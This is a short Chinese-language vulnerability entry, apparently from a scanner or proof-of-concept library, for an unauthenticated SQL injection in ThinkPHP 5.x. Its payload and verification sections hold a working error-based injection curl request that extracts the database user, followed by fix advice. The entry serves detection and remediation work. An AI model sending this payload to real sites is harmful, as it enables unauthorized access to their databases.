---
id: THINKPHP-IN-SQLINJECTION
title: ThinkPHP5 SQL注入漏洞
product: thinkphp
vendor: ThinkPHP
version_affected: "<= 5.x"
severity: HIGH
tags: [sqli, 无需认证]
fingerprint: ["ThinkPHP", "ThinkPHP 5.x"]
---

## 漏洞描述

ThinkPHP 5.x 版本中存在 SQL 注入漏洞。由于没有正确处理数组类型的请求参数，攻击者可以通过构造恶意的 SQL 语句获取数据库敏感信息。

## 影响版本

- ThinkPHP 5.x

## 前置条件

- 无需认证
- 目标使用 ThinkPHP 5.x 且存在注入点

## 利用步骤

1. 找到存在注入的接口
2. 使用报错注入或布尔注入获取数据

## Payload

```bash
# 利用数组参数进行 SQL 注入
curl "http://target:8080/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
```

## 验证方法

```bash
# 检查是否返回数据库用户信息
curl -s "http://target:8080/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1" | grep user
```

## 修复建议

1. 升级 ThinkPHP 至最新版本
2. 使用参数化查询
3. 对用户输入进行严格过滤
